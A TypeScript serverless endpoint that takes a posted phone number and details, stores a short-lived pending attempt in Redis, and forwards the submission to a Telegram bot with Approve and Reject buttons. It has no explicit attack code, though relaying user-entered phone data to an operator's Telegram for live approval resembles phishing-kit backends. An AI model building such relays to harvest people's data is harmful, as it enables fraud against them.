import type { VercelRequest, VercelResponse } from '@vercel/node';
import { Redis } from "@upstash/redis";

export default async function handler(req: VercelRequest, res: VercelResponse) {
    if (req.method !== "POST") {
        return res.status(405).send("Method Not Allowed");
    }

    try {
        const body = typeof req.body === 'string' ? JSON.parse(req.body) : (req.body || {});
        const { type, name, phone, details } = body;

        if (!phone) {
            return res.status(400).json({ success: false, message: "Phone number is required" });
        }

        const redis = new Redis({
            url: process.env.UPSTASH_REDIS_REST_URL || "",
            token: process.env.UPSTASH_REDIS_REST_TOKEN || "",
        });

        const attemptId = Math.random().toString(36).substring(2, 15);
        await redis.set(`attempt:${attemptId}`, "pending", { ex: 300 });

        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;

        if (botToken && chatId) {
            const message = `🔔 *New Approval Request*\n\n*Type:* ${type}\n*Phone:* ${phone}\n*Details:* ${details}\n\n*Attempt ID:* \`${attemptId}\``;
            
            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
            
            await fetch(telegramUrl, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: "Markdown",
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: "✅ Approve", callback_data: `approve_${attemptId}` },
                                { text: "❌ Reject", callback_data: `reject_${attemptId}` }
                            ]
                        ]
                    }
                }),
            });
        } else {
            console.warn("Telegram BOT token or Chat ID not configured. Skipping notification.");
        }

        return res.status(200).json({ success: true, attemptId });
    } catch (error) {
        console.error("Callback Error:", error);
        return res.status(500).json({ success: false, message: "Internal Server Error" });
    }
}
